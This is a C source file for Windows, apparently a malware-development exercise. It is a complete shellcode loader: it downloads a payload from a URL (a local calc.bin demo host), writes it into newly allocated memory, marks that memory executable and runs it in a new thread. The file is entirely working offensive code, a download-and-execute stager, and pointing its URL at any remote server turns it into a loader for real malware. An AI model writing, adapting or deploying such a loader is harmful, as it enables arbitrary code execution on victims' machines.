#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>

#pragma comment (lib, "Wininet.lib")

// Python3 -m http.server 8080
// Have calc.bin in the directory
#define PAYLOAD	L"http://127.0.0.1:8080/calc.bin"

// Get a file's payload from a url (http or https)
// Return a base address of a heap allocated buffer, thats the payload
// Return the payload's size
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 			// Used as the total payload size

	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
		pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevE1n", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}



int main() {

	SIZE_T	Size = NULL;
	PBYTE	Bytes = NULL;


	// Reading the payload 
	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
		return -1;
	}


	printf("[i] Bytes : 0x%p \n", Bytes);
	printf("[i] Size  : %ld \n", Size);

	// Allocating memory the size of Size
   // With memory permissions set to read and write so that we can write the payload later
	PVOID pShellcodeAddress = VirtualAlloc(NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return -1;
	}

	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();

	// Copying the payload to the allocated memory
	memcpy(pShellcodeAddress, Bytes, Size);
	// Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
	memset(Bytes, '\0', Size);

	DWORD dwOldProtection = NULL;
	// Setting memory permissions at pShellcodeAddress to be executable
	if (!VirtualProtect(pShellcodeAddress, Size, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return -1;
	}

	printf("[#] Press <Enter> To Run ... ");
	getchar();

	// Running the shellcode as a new thread's entry 
	HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);

	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return -1;
	}

	//Wait for infinite time until the thread executes the shellcode
	WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	// Close the thread handle when you're done with it
	CloseHandle(hThread);
	// Freeing Bytes
	LocalFree(Bytes);
	// Freeing pShellcodeAddress
	VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);

	return 0;
}









